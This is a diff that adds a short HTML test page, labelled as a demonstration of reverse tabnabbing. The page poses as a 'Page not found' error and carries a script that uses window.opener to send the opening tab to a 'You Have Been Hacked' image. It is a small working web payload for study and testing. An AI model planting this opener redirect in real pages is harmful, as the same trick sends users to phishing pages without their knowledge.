@@ -1,0 +1,20 @@
+<!-- This is a test page to demonstrate Reverse Tabnabbing attack -->
+<html>
+  <head>
+    <title>Page not found</title>
+    <script>
+      if (window.opener) {
+        window.opener.location =
+          "https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg";
+      }
+    </script>
+  </head>
+  <body>
+    <h1>Page not found</h1>
+    <p>
+      The page you are looking for might have been removed, had its name
+      changed, or is temporarily unavailable.
+    </p>
+    <p>Please go back where you came from :(</p>
+  </body>
+</html>
